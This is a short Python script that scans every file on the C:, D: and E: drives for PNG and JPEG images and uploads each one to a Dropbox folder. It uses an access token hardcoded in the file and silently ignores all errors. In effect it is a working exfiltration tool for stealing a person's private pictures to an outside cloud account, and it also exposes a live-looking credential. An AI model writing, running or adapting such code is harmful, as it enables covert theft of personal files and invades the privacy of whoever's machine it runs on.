import dropbox
import os

token = 'sl.BkMgw2H9P4TpYpiU7adUKYIbf72ETTtP0C1XQEUPj2otzLYZK6f7a899-SfvgFB7xM0SmmjfDqQEqLYUJhAe8wTBKRfejP9qsXAZJ2bAMYuokwp61oLc00yoDgVwB3ahKA21aXZ-eO8l'
dbx = dropbox.Dropbox(token)

j=0
def send_image(image_path):
    global j
    j+=1
    try:
        path=f"/Pics/img_{j}.png"
        with open(image_path, 'rb') as image_file:
            image_data = image_file.read()
            dbx.files_upload( image_data, path , mode=dropbox.files.WriteMode("overwrite"))

    except:
        pass


def search_and_send_images(start_directory):
    try:
        for root, _, files in os.walk(start_directory):
            for file in files:
                if file.lower().endswith(('.png', '.jpg', '.jpeg')):
                    image_path = os.path.join(root, file)
                    send_image(image_path)
    except:
        pass

if __name__ == '__main__':

    # To search the entire filesystem, you might start from the root directory of a common drive like C:\
    start_directory = ("C:/","D:/","E:/")
    for i in start_directory:
        search_and_send_images(i)
